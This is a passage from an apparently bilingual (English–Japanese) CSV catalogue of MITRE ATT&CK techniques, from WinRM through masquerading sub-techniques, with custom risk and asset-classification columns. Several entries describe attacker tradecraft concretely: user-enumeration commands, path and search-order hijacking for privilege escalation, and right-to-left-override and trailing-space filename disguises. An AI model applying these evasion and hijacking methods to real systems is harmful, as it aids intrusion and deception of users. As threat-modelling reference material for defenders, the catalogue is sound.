2022）* 悪意のあるペイロードをダウンロードする（引用元：Cofense SVG Smuggling 2024）* ユーザーを悪意のあるウェブサイトにリダイレクトする（引用元：Bleeping Computer SVG Smuggling 2024）* 偽のログインフォームやダウンロードボタンなどのインタラクティブコンテンツをユーザーに表示する。(引用元: Bleeping Computer SVG Smuggling 2024) SVG Smuggling は、悪意のあるペイロードを含む SVG を HTML ファイル内に埋め込む [HTML Smuggling](https://attack.mitre.org/techniques/T1027/006) と組み合わせて使用される場合があります。(引用元: Talos SVG Smuggling 2022) SVG は、PDF などの他の種類の文書にも含めることができます。,defense-evasion,Linux;macOS;Windows,script_command_execution,stealth,authentication_system;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--78b9e70d-1605-459c-b23d-e3a25036968c,2025-03-25T15:31:09.697Z,2025-04-15T19:58:43.263Z,,,,
T1028,,Windows Remote Management,Windows リモート管理,"Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). (Citation: Microsoft WinRM) It may be called with the <code>winrm</code> command or by any number of programs such as PowerShell. (Citation: Jacobsen 2014)",Windows リモート管理 (WinRM) は、Windows サービスおよびプロトコルの名称であり、ユーザーがリモートシステムと対話することを可能にします（例：実行可能ファイルの実行、レジストリの変更、サービスの変更）。(引用元: Microsoft WinRM) <code>winrm</code> コマンド、または PowerShell などの様々なプログラムから呼び出すことができます。(引用元: Jacobsen 2014),execution;lateral-movement,Windows,remote_service_abuse,boundary_crossing,user_interaction;endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0002;TA0008,attack-pattern--c3bce4f4-9795-46c6-976e-8676300bbc39,2017-05-31T21:30:33.723Z,2025-04-25T15:16:07.449Z,,,,
T1029,,Scheduled Transfer,スケジュールされた転送,"Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability. When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",攻撃者は、データ漏洩を特定の時間帯や間隔でのみ実行するようスケジュール設定する場合があります。これはトラフィックパターンを通常の活動や稼働状況に溶け込ませるためです。 スケジュールされた情報漏洩が使用される場合、情報をネットワーク外に転送するために、[C2チャネル経由の情報漏洩](https://attack.mitre.org/techniques/T1041) や [代替プロトコル経由の情報漏洩](https://attack.mitre.org/techniques/T1048) などの他の情報漏洩手法も併用される可能性が高い。,exfiltration,Linux;macOS;Windows,data_exfiltration,data_outflow,network_connectivity,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466,2017-05-31T21:30:34.139Z,2025-04-15T23:03:03.336Z,,,,
T1030,,Data Transfer Size Limits,データ転送サイズ制限,An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.,攻撃者は、ファイル全体ではなく固定サイズのチャンクでデータを流出させるか、パケットサイズを特定の閾値以下に制限することがあります。この手法は、ネットワークデータ転送閾値アラートをトリガーしないようにするために使用される可能性があります。,exfiltration,Linux;macOS;Windows;ESXi,data_exfiltration,data_outflow,network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd,2017-05-31T21:30:34.523Z,2025-04-15T19:59:05.559Z,,,,
T1031,,Modify Existing Service,既存サービスの変更,"Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075). Adversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the Windows API. Use of existing services is a type of [Masquerading](https://attack.mitre.org/techniques/T1036) that may make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. Adversaries may also intentionally corrupt or kill services to execute malicious recovery programs/commands. (Citation: Twitter Service Recovery Nov 2017) (Citation: Microsoft Service Recovery Feb 2013)",Windows サービスの構成情報（サービス実行ファイルや回復プログラム/コマンドへのファイルパスを含む）はレジストリに保存される。サービス構成は sc.exe や [Reg](https://attack.mitre.org/software/S0075) などのユーティリティを使用して変更可能である。 攻撃者は、システムユーティリティやカスタムツールを使用してWindows APIとやり取りすることで、既存のサービスを改変し、システム上にマルウェアを永続化させることが可能です。既存サービスの利用は[偽装](https://attack.mitre.org/techniques/T1036)の一種であり、検知分析をより困難にする可能性があります。 既存サービスの変更は、その機能を中断させたり、無効化されている、あるいは通常使用されないサービスを有効化したりする可能性があります。攻撃者はまた、悪意のある回復プログラム/コマンドを実行するために、意図的にサービスを破損または強制終了させることもあります。（引用元：Twitterサービス回復 2017年11月）（引用元：Microsoftサービス回復 2013年2月）,persistence,Windows,script_command_execution,foothold,endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--62dfd1ca-52d5-483c-a84b-d6e80bf94b7b,2017-05-31T21:30:34.928Z,2025-04-25T15:15:37.255Z,,,,
T1032,,Standard Cryptographic Protocol,標準暗号プロトコル,"Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.",攻撃者は、通信プロトコルが提供する固有の保護機能に依存せず、既知の暗号化アルゴリズムを明示的に使用してコマンド＆コントロール通信を隠蔽する可能性がある。安全なアルゴリズムを使用しているにもかかわらず、必要な秘密鍵がマルウェアサンプル/設定ファイル内でエンコードおよび/または生成されている場合、これらの実装はリバースエンジニアリングに対して脆弱となる可能性がある。,command-and-control,Linux;macOS;Windows,script_command_execution,remote_control,endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5,2017-05-31T21:30:35.334Z,2025-04-25T15:15:29.881Z,,,,
T1033,,System Owner/User Discovery,システム所有者/ユーザー発見,"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Various utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information. On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)",攻撃者は、プライマリユーザー、現在ログイン中のユーザー、システムを頻繁に使用するユーザー群、あるいはユーザーがシステムをアクティブに使用しているか否かを特定しようとする可能性がある。例えば、アカウントのユーザー名を取得したり、[OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)を利用したりしてこれを行う。 ユーザーおよびユーザー名の詳細は、実行中のプロセスの所有権、ファイル/ディレクトリの所有権、セッション情報、システムログなど、システム全体に広く存在するため、他の発見技術を用いて様々な方法で収集される可能性があります。 攻撃者は自動化された情報収集中に[システム所有者/ユーザー発見](https://attack.mitre.org/techniques/T1033)から得た情報を活用し、ターゲットへの完全な感染の可否や特定の行動の試行など、その後の行動を決定します。 この情報は<code>whoami</code>を含む各種ユーティリティやコマンドで取得可能です。macOSとLinuxでは、<code>w</code>および<code>who</code>で現在ログイン中のユーザーを特定できます。macOSでは<code>dscl . list /Users | grep -v '_'</code>コマンドもユーザーアカウント列挙に利用可能です。 環境変数（例：<code>%USERNAME%</code> や <code>$USER</code>）もこの情報へのアクセス手段となり得る。ネットワーク機器では、`show users` や `show ssh` といった [ネットワーク機器 CLI](https://attack.mitre.org/techniques/T1059/008) コマンドにより、現在ログイン中のユーザーを表示できる。(引用: show_ssh_users_cmd_cisco)(引用: US-CERT TA18-106A Network Infrastructure Devices 2018),discovery,Linux;macOS;Windows;Network Devices,credential_abuse,situational_awareness,authentication_system;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104,2017-05-31T21:30:35.733Z,2025-04-15T19:58:02.301Z,,,,
T1034,,Path Interception,パス傍受,"**This technique has been deprecated. Please use [Path Interception by PATH Environment Variable](https://attack.mitre.org/techniques/T1574/007), [Path Interception by Search Order Hijacking](https://attack.mitre.org/techniques/T1574/008), and/or [Path Interception by Unquoted Path](https://attack.mitre.org/techniques/T1574/009).** Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of [cmd](https://attack.mitre.org/software/S0106) in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. (Citation: TechNet MS14-019) There are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process. ### Unquoted Paths Service paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path with space\program.exe</code> vs. <code>""C:\safe path with space\program.exe""</code>). (Citation: Baggett 2012) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>, an adversary may create a program at <code>C:\program.exe</code> that will be run instead of the intended program. (Citation: SecurityBoulevard Unquoted Services APR 2018) (Citation: SploitSpren Windows Priv Jan 2018) ### PATH Environment Variable Misconfiguration The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\system32</code> (e.g., <code>C:\Windows\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line. For example, if <code>C:\example path</code> precedes <code>C:\Windows\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\example path</code> will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line. ### Search Order Hijacking Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory. For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument <code>net user</code>. An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then <code>cmd.exe /C net user</code> will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT. (Citation: MSDN Environment Property) Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).","この手法は非推奨となりました。[PATH環境変数によるパス傍受](https://attack.mitre.org/techniques/T1574/007)、 [検索順序ハイジャックによるパスインターセプト](https://attack.mitre.org/techniques/T1574/008)、および/または[引用符で囲まないパスによるパスインターセプト](https://attack.mitre.org/techniques/T1574/009)をご利用ください。** パスインターセプトは、実行可能ファイルが特定のパスに配置され、意図したターゲットではなくアプリケーションによって実行される場合に発生します。この一例として、CreateProcess関数でCMDまたはBATファイルをロードする脆弱なアプリケーションの現在の作業ディレクトリに[cmd](https://attack.mitre.org/software/S0106)のコピーを使用する手法が挙げられます。 (引用元: TechNet MS14-019) パスインターセプトを実行する際、攻撃者が悪用し得る複数の異なる脆弱性や設定ミスが存在する：引用符で囲まれていないパス、パス環境変数の設定ミス、検索順序の乗っ取りである。 最初の脆弱性は完全なプログラムパスに関連し、2番目と3番目はプログラムパスが指定されていない場合に発生します。これらの手法は、実行ファイルが定期的に呼び出される場合の永続化や、より高い特権を持つプロセスによって開始されたインターセプトされた実行ファイルによる特権昇格に利用される可能性があります。 ### 引用符で囲まれていないパスサービスパス（Windowsレジストリキーに保存）（引用元：Microsoftサブキー）やショートカットパスは、パスに1つ以上のスペースが含まれ引用符で囲まれていない場合（例：<code>C:\スペースを含む安全でないパス\program.exe</code> 対 <code>""C:\スペースを含む安全なパス\program.exe""</code>）、パスインターセプトの脆弱性があります。 (引用元: Baggett 2012) 攻撃者はパス上の上位ディレクトリに実行可能ファイルを配置でき、Windowsは意図した実行ファイルではなくそのファイルを解決します。例えばショートカットのパスが<code>C:\program files\myapp.exe</code>の場合、攻撃者は<code>C:\program.exe</code>にプログラムを作成し、意図したプログラムの代わりに実行させることが可能です。 (引用元: SecurityBoulevard Unquoted Services APR 2018) (引用元: SploitSpren Windows Priv Jan 2018) ### PATH環境変数の設定ミス PATH環境変数にはディレクトリのリストが含まれます。 プログラムの実行方法によっては（特にcmd.exeやコマンドラインを使用する場合）、プログラムのパスが指定されていない際に検索される場所を決定するために、PATH環境変数のみに依存します。PATH環境変数にWindowsディレクトリ（<code>%SystemRoot%\system32</code>）より前にディレクトリがリストされている場合、 （例：<code>C:\Windows\system32</code>）よりも前にリストされている場合、Windowsプログラム（cmd、PowerShell、Pythonなど）と同じ名前のプログラムが先行するディレクトリに配置されると、スクリプトやコマンドラインからそのコマンドが実行された際に実行されてしまいます。 例えば、PATH環境変数で<code>C:\example path</code>が<code>C:\Windows\system32</code>の前にある場合、コマンドラインから「net」を実行すると、Windowsシステムの「net」ではなく、<code>C:\example path</code>に配置されたnet.exeという名前のプログラムが呼び出されます。 ### 検索順序ハイジャック検索順序ハイジャックは、パスが指定されていないプログラムをWindowsが検索する順序を攻撃者が悪用する行為です。検索順序はプログラムの実行方法によって異なります。（引用元: Microsoft CreateProcess）（引用元: Hill NT Shell) (引用元: Microsoft WinExec) ただし、Windows は通常、Windows システムディレクトリを検索する前に、起動元プログラムのディレクトリを検索します。検索順序ハイジャックの脆弱性を持つプログラム（つまり、実行ファイルへのパスを指定していないプログラム）を見つけた攻撃者は、不適切に指定されたプログラムと同じ名前でプログラムを作成し、起動元プログラムのディレクトリ内に配置することで、この脆弱性を悪用できます。 例えば、「example.exe」がコマンドライン引数<code>net user</code>付きで「cmd.exe」を実行する場合、攻撃者が「example.exe」と同じディレクトリに「net.exe」というプログラムを配置すると、Windowsシステムユーティリティのnetではなく「net.exe」が実行される。 さらに、攻撃者が「net.exe」と同じディレクトリに「net.com」というプログラムを配置した場合、PATHEXTで定義された実行可能拡張子の順序により、<code>cmd.exe /C net user</code>は「net.exe」ではなく「net.com」を実行します。 （引用元：MSDN Environment Property）検索順序の乗っ取りは、DLLロードの乗っ取りにもよく用いられる手法であり、[DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038) で解説されています。",persistence;privilege-escalation,Windows,script_command_execution,privilege_gain,privileged_account;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--c4ad009b-6e13-4419-8d21-918a1652de02,2017-05-31T21:30:36.140Z,2025-04-25T15:16:07.873Z,,,,
T1035,,Service Execution,サービス実行,"Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with [New Service](https://attack.mitre.org/techniques/T1050) and [Modify Existing Service](https://attack.mitre.org/techniques/T1031) during service persistence or privilege escalation.",攻撃者は、サービス制御マネージャーなどの Windows サービスと連携する手法を通じて、バイナリ、コマンド、またはスクリプトを実行する可能性があります。これは、新規サービスの作成または既存サービスの変更のいずれかによって実現されます。 この手法は、サービスの永続化や特権昇格の際に、[新規サービスの作成](https://attack.mitre.org/techniques/T1050) および [既存サービスの変更](https://attack.mitre.org/techniques/T1031) と組み合わせて使用されます。,execution,Windows,script_command_execution,foothold,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--f44731de-ea9f-406d-9b83-30ecbb9b4392,2017-05-31T21:30:36.550Z,2025-04-25T15:16:22.595Z,,,,
T1036,,Masquerading,偽装,"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names. Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",攻撃者は、ユーザーやセキュリティツールに対して正当または無害に見せかけるため、アーティファクトの機能を操作しようとする場合があります。正当なものであれ悪意のあるものであれ、防御や監視を回避する目的でオブジェクトの名前や場所を操作または悪用する行為が偽装です。これには、ファイルメタデータの操作、ユーザーを騙してファイルタイプを誤認させる行為、正当なタスク名やサービス名の付与などが含まれます。 セキュリティ監視を回避するために悪用可能なシステムユーティリティの名前を変更することも、[偽装](https://attack.mitre.org/techniques/T1036)の一形態である。(引用元: LOLBAS Main Site),defense-evasion,Linux;macOS;Windows;Containers;ESXi,other,stealth,user_interaction;file_storage_access;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0,2017-05-31T21:30:38.511Z,2025-04-15T19:58:26.186Z,,,,
T1036.001,T1036,Invalid Code Signature,無効なコード署名,"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017) Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.",攻撃者は、ユーザー、アナリスト、ツールを欺く可能性を高めるため、有効なコード署名の特徴を模倣しようとする場合があります。コード署名は、開発者によるバイナリへの信頼性の保証と、バイナリが改ざんされていないことの保証を提供します。攻撃者は、署名済みプログラムからメタデータと署名情報をコピーし、それを署名なしプログラムのテンプレートとして使用できます。 無効なコード署名を持つファイルはデジタル署名検証チェックに失敗しますが、ユーザーにはより正当に見え、セキュリティツールがこれらのファイルを誤って処理する可能性があります。（引用元：Threatexpress MetaTwin 2017）[コード署名](https://attack.mitre.org/techniques/T1553/002)とは異なり、この活動は有効な署名を生成しません。,defense-evasion,macOS;Windows,defense_disable,stealth,user_interaction;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52,2020-02-10T19:49:46.752Z,2025-04-15T22:43:00.641Z,,,,
T1036.002,T1036,Right-to-Left Override,右から左へのオーバーライド,"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique) Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",攻撃者は、文字列やファイル名を偽装して無害に見せかけるため、右から左への文字順置換（RTLOまたはRLO）文字（U+202E）を悪用する可能性があります。RTLOは非表示のUnicode文字であり、これに続くテキストを逆方向に表示させます。 例えば、Windowsスクリーンセーバー実行ファイル<code>March 25 \u202Excod.scr</code>は<code>March 25 rcs.docx</code>と表示される。JavaScriptファイル<code>photo_high_re\u202Egnp.js</code>は<code>photo_high_resj.png</code>と表示される。（出典: Infosecinstitute RTLO Technique）攻撃者は、ユーザーを騙して無害なファイルタイプと誤認させ実行させる手段としてRTLO文字を悪用する可能性があります。この手法の一般的な使用例は、[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001)/[悪意のあるファイル](https://attack.mitre.org/techniques/T1204/002) への添付ファイル攻撃でよく見られます。これは、エンドユーザーと防御側の双方が、自身のツールがRTLO文字をどのように表示・レンダリングするかを知らない場合に騙される可能性があるためです。 RTLO文字の使用は、多くの標的型侵入試行や犯罪活動で確認されている。（引用元：Trend Micro PLEAD RTLO）（引用元：Kaspersky RTLO Cyber Crime）RTLOはWindowsレジストリでも使用可能であり、regedit.exeでは逆転文字が表示されるが、コマンドラインツールのreg.exeではデフォルトでは表示されない。,defense-evasion,Linux;macOS;Windows,script_command_execution,stealth,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--77eae145-55db-4519-8ae5-77b0c7215d69,2020-02-10T19:55:29.385Z,2025-04-15T23:00:50.575Z,,,,
T1036.003,T1036,Rename Legitimate Utilities,正規ユーティリティの名前変更,"Adversaries may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for legitimate utilities adversaries are capable of abusing, including both built-in binaries and tools such as PSExec, AutoHotKey, and IronPython.(Citation: LOLBAS Main Site)(Citation: Huntress Python Malware 2025)(Citation: The DFIR Report AutoHotKey 2023)(Citation: Splunk Detect Renamed PSExec) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).(Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on these utilities executing from non-standard paths.(Citation: F-Secure CozyDuke)",攻撃者は、正当な/システムユーティリティの名前を変更し、それらのユーティリティの使用に関するセキュリティメカニズムを回避しようとする可能性があります。攻撃者が悪用可能な正当なユーティリティ（組み込みバイナリやPSExec、AutoHotKey、IronPythonなどのツールを含む）に対して、セキュリティ監視および制御メカニズムが導入されている場合があります。(引用: LOLBAS Main Site)(引用: Huntress Python Malware 2025)(引用: The DFIR Report AutoHotKey 2023)(引用: Splunk Detect Renamed PSExec) ユーティリティ使用前に名前を変更することで（例: `rundll32.exe` のリネーム）、これらのセキュリティメカニズムを回避できる可能性がある。(引用: Elastic Masquerade Ball) 別のケースとして、正当なユーティリティがコピーまたは移動され、非標準パスからの実行に基づく検知を回避するために名前が変更される場合がある。(引用: F-Secure CozyDuke),defense-evasion,Linux;macOS;Windows,other,stealth,logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--bd5b58a4-a52d-4a29-bc0d-3f1d3968eb6b,2020-02-10T20:03:11.691Z,2025-04-15T19:59:02.921Z,,,,
T1036.004,T1036,Masquerade Task or Service,変装タスクまたはサービス,"Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones. Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",攻撃者は、タスクやサービスの名前を操作して正当または無害に見せかける可能性があります。タスク スケジューラや systemd によって実行されるタスク/サービスには、通常、名前や説明が付けられます。(引用: TechNet Schtasks)(引用: Systemd Service Units) Windows サービスには、サービス名と表示名があります。一般的に使用される名前を持つ無害なタスクやサービスは数多く存在します。 攻撃者は、正当なタスクやサービスと類似または同一の名称を付与することがある。タスクやサービスには説明文などの他のフィールドも存在し、攻撃者はこれらを正当に見せかける試みを行う可能性がある。(引用: Palo Alto Shamoon Nov 2016)(引用: Fysbis Dr Web Analysis),defense-evasion,Windows;Linux;macOS,script_command_execution,stealth,authentication_system;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c,2020-02-10T20:30:07.426Z,2025-04-15T22:48:29.215Z,,,,
T1036.005,T1036,Match Legitimate Resource Name or Location,正当なリソース名または場所との一致,"Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.(Citation: Aquasec Kubernetes Backdoor 2023)",攻撃者は、正当なファイル、レジストリキー、その他のリソースの名前や配置場所を、命名/配置時に一致させたり近似させたりすることがあります。これは防御策や監視を回避するために行われます。例えば、実行ファイルを一般的に信頼されるディレクトリ（例：System32以下）に配置したり、正当で信頼されたプログラムの名前（例：`svchost.exe`）を付与したりする方法があります。 あるいは、Windowsレジストリキーを正当なプログラムが使用するキーに近似させる場合もある。コンテナ化された環境では、脅威アクターが信頼された名前空間内にリソースを作成したり、コンテナポッドやクラスターの命名規則に一致する名前を付ける可能性がある。（引用元: Aquasec Kubernetes Backdoor 2023）,defense-evasion,Linux;macOS;Windows;Containers;ESXi,config_policy_manipulation,stealth,file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2,2020-02-10T20:43:10.239Z,2025-04-15T19:58:11.443Z,,,,
T1036.006,T1036,Space after Filename,ファイル名の後のスペース,"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back). Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",攻撃者はファイル拡張子を変更することでプログラムの真のファイルタイプを隠蔽できる。特定のファイルタイプ（特に.app拡張子では機能しない）では、ファイル名の末尾にスペースを追加するとオペレーティングシステムによる処理方法が変化する。 例えば、<code>evil.bin</code> という Mach-O 実行可能ファイルがある場合、ユーザーがダブルクリックすると Terminal.app が起動して実行されます。このファイルを <code>evil.txt</code> にリネームすると、ユーザーがダブルクリックした際にデフォルトのテキスト編集アプリケーションが起動します（バイナリは実行されません）。 ただし、ファイル名を<code>evil.txt </code>（末尾のスペースに注意）に変更した場合、ユーザーがダブルクリックするとOSが真のファイルタイプを判別し適切に処理するため、バイナリが実行されます（出典: Mac Backdoors are 